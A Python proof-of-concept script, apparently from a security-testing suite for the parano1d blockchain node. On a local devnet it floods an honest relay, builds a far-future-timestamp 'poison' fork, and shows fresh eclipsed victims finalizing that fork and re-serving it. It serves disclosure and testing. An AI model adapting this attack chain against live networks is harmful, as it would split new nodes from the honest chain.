#!/usr/bin/env python3
"""Phase 8 — the live C17 -> C26 chain (LOW-HASHPOWER MECHANISM DEMO).

Honestly scoped: this demonstrates the poisoning MECHANISM on a small devnet at
genesis-floor difficulty, against a fresh/eclipsed victim whose DAG is
genesis-only (the exact population also vulnerable on mainnet). It is NOT a
demonstration of out-hashing the real ~912 GH/s network; established nodes and
finalized mainnet history remain protected by fork choice.

Topology:
  honest:  n1 (genesis miner) -> n2 (relay)              real clock, honest chain
  poison:  P = bin/parano1d-poison, NOID_POISON_CLOCK_OFFSET_SECS=+10y, genesis
           miner, ISOLATED from honest (seeds none) -> a competing fork whose
           headers carry far-future timestamps (honest native admission rejects
           them by rule; the floored difficulty makes the fork cheap).
  attack:  bin/anon-mempool-pin pins n2 (the honest relay's serving domain).
  victim:  V = fresh node seeded to [n2 (pinned), P]. Eclipsed from honest, it
           snapshot-syncs from P and commits the poison as FINALIZED history.
  spread:  V2 = fresh node seeded to [V] -> re-syncs the poison from the victim.

Permanent consequences shown: (a) V is estranged from honest (its finalized tip
is the poison fork, which honest rejects); (b) V re-serves the poison to V2.
"""

import os
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from chaoslib import (  # noqa: E402
    BIN,
    MINING_KEY_N1,
    OPERATOR_KEY_N1,
    Managed,
    Node,
    RUN,
    grep_log,
    rpc,
    start_aggressor,
    start_worker,
    stop_all,
    wait_until,
)

POISON_BIN = BIN / "parano1d-poison"
TEN_YEARS = 10 * 365 * 24 * 3600


def stop_worker_safe(started, name):
    for item in list(started):
        if getattr(item, "name", None) == name:
            try:
                item.stop()
            except Exception:  # noqa: BLE001
                pass
            started.remove(item)
            return


def chain_view(url):
    info = rpc(url, "getChainInfo", raw_error=True)
    if not isinstance(info, dict):
        return (-1, "?")
    return (int(info.get("height", -1)), str(info.get("best_hash", "?"))[:16])


def header_timestamp(node, height):
    """Block timestamp at a height via the CLI block-header (structured)."""
    out, _, code = node.cli(["block-header", str(height)], check=False)
    import re

    m = re.search(r"[Tt]imestamp\D+(\d{9,})", out)
    return int(m.group(1)) if m else None


def main():
    started = []
    # Honest side.
    n1 = Node("p8-n1", 19810, 19811, mode="extminer", genesis=True,
              mining_key=MINING_KEY_N1, operator_key=OPERATOR_KEY_N1)
    n2 = Node("p8-n2", 19820, 19821, seeds=[n1.p2p_addr])
    try:
        print("=== PHASE 8: live C17 -> C26 chain (low-hashpower mechanism demo) ===", flush=True)
        if not POISON_BIN.exists():
            raise SystemExit(f"missing {POISON_BIN}")

        # 1) Honest chain.
        n1.start(); started.append(n1)
        n2.start(); started.append(n2)
        w1 = start_worker("p8-w1", n1, threads=6, key=MINING_KEY_N1); started.append(w1)
        wait_until("honest chain >= 30", lambda: n1.height() if n1.height() >= 30 else False,
                   timeout=900, interval=3, quiet=True)
        # Freeze the honest chain at low work (this is the regime the attack needs
        # and the only one it reaches: a fresh victim with ~no honest work to
        # protect it; on mainnet honest work is 912 GH/s x 313k blocks and the
        # poison fork cannot out-work it).
        stop_worker_safe(started, "p8-w1")
        honest = chain_view(n1.rpc_url)
        print(f"[phase8] honest chain frozen at low work: {honest}", flush=True)
        honest_height = honest[0]

        # 2) Poison node: isolated genesis miner, consensus clock +10 years.
        poison_dir = RUN / "p8-poison"
        import shutil
        if poison_dir.exists():
            shutil.rmtree(poison_dir)
        poison_dir.mkdir(parents=True)
        poison = Managed(
            "p8-poison",
            [str(POISON_BIN), "--mode", "miner", "--genesis",
             "--data-dir", str(poison_dir),
             "--p2p-listen", "127.0.0.1:19830", "--rpc-listen", "127.0.0.1:19831",
             "--disable-dns-seeds", "--log", "info"],
            env={"NOID_POISON_CLOCK_OFFSET_SECS": str(TEN_YEARS)},
        ).start()
        started.append(poison)
        poison_rpc = "http://127.0.0.1:19831"
        wait_until("poison node RPC ready",
                   lambda: isinstance(rpc(poison_rpc, "getChainInfo", raw_error=True), dict),
                   timeout=90, interval=1, quiet=True)
        poison_target = honest_height + 30  # out-work the frozen honest chain
        wait_until(f"poison fork out-works honest (>= {poison_target})",
                   lambda: (lambda h: h if h >= poison_target else False)(chain_view(poison_rpc)[0]),
                   timeout=1200, interval=3, quiet=True)
        poison_view = chain_view(poison_rpc)
        print(f"[phase8] poison fork built (isolated, far-future ts): {poison_view}", flush=True)
        # Show the far-future timestamp on a poison block vs an honest block.
        print(f"[phase8] honest h10 unix ts = {header_timestamp(n1, 10)}", flush=True)
        poison_ctl = Node("p8-poison-ctl", 0, 19831)  # rpc-only wrapper for cli
        poison_ctl.managed = poison
        print(f"[phase8] poison h10 unix ts = {header_timestamp(poison_ctl, 10)} (=+~10y)", flush=True)

        # 3) C17 pin on the honest relay n2.
        agg = start_aggressor("p8-anon", n2.p2p_addr, 600, streams=4, rotate=24)
        started.append(agg)
        time.sleep(8)
        print("[phase8] anonymous C17 pin engaged on honest relay n2", flush=True)

        # 4) Fresh victim seeded to [n2 (pinned honest), P (poison)].
        victim = Node("p8-victim", 19840, 19841, seeds=[n2.p2p_addr, "127.0.0.1:19830"])
        if (RUN / "p8-victim").exists():
            shutil.rmtree(RUN / "p8-victim")
        victim.start(); started.append(victim)
        print("[phase8] fresh victim joined, seeded to pinned-honest-relay + poison", flush=True)

        # Watch what the victim adopts.
        poison_tip = poison_view[1]
        honest_tip = chain_view(n1.rpc_url)[1]
        committed_poison = False
        samples = []
        t0 = time.monotonic()
        while time.monotonic() - t0 < 240:
            v = chain_view(victim.rpc_url)
            samples.append((round(time.monotonic() - t0), v[0], v[1]))
            if v[1] == poison_tip or (v[0] >= poison_view[0] and v[1] != honest_tip):
                committed_poison = True
                break
            time.sleep(8)
        v_final = chain_view(victim.rpc_url)
        print(f"[phase8] victim tip progression: {samples}", flush=True)
        print(
            f"[phase8] victim final tip {v_final} vs honest {chain_view(n1.rpc_url)} vs poison {poison_view}",
            flush=True,
        )
        on_poison = v_final[1] == poison_tip
        print(
            f"[phase8] VICTIM COMMITTED: {'POISON fork (far-future, honest-rejecting)' if on_poison else 'honest or neither'}"
            f" -> C17->C26 chain {'DEMONSTRATED' if on_poison else 'partial (see log)'}",
            flush=True,
        )
        for line in grep_log(victim.managed.log_path,
                             r"snapshot|finaliz|install|commit|poison|BadTimestamp|FinalizedDivergence")[-10:]:
            print(f"    [victim] {line[:200]}", flush=True)

        # 5) Estrangement: does the victim reject the honest chain now?
        if on_poison:
            for line in grep_log(victim.managed.log_path, r"FinalizedDivergence|reject|incompatible|divergen")[-6:]:
                print(f"    [victim-estrangement] {line[:200]}", flush=True)

        # 6) Re-serve: a second fresh joiner seeded ONLY to the victim.
        v2 = Node("p8-victim2", 19850, 19851, seeds=[victim.p2p_addr])
        if (RUN / "p8-victim2").exists():
            shutil.rmtree(RUN / "p8-victim2")
        v2.start(); started.append(v2)
        print("[phase8] second fresh joiner seeded ONLY to the victim (tests self-propagation)", flush=True)
        t1 = time.monotonic()
        v2_got_poison = False
        while time.monotonic() - t1 < 180:
            v2v = chain_view(v2.rpc_url)
            if v2v[1] == poison_tip or (v2v[0] >= poison_view[0] and v2v[1] == v_final[1]):
                v2_got_poison = True
                break
            time.sleep(8)
        v2_final = chain_view(v2.rpc_url)
        print(
            f"[phase8] second joiner final tip {v2_final}"
            f" -> poison RE-SERVED by the victim: {v2_got_poison}",
            flush=True,
        )

        print(
            f"[phase8] RESULT: victim_on_poison={on_poison} reserved_to_next={v2_got_poison}", flush=True)
        print(
            "[phase8] SCOPE: demonstrated the poisoning MECHANISM on a floor-difficulty devnet"
            " against fresh/eclipsed victims (genesis-only DAG); NOT a claim about out-hashing"
            " the live ~912 GH/s network. Established nodes / finalized mainnet history remain"
            " protected by fork choice.",
            flush=True,
        )
        print("PHASE8 OK", flush=True)
    finally:
        stop_all(started)
        print("[phase8] topology shut down by PID files", flush=True)


if __name__ == "__main__":
    main()
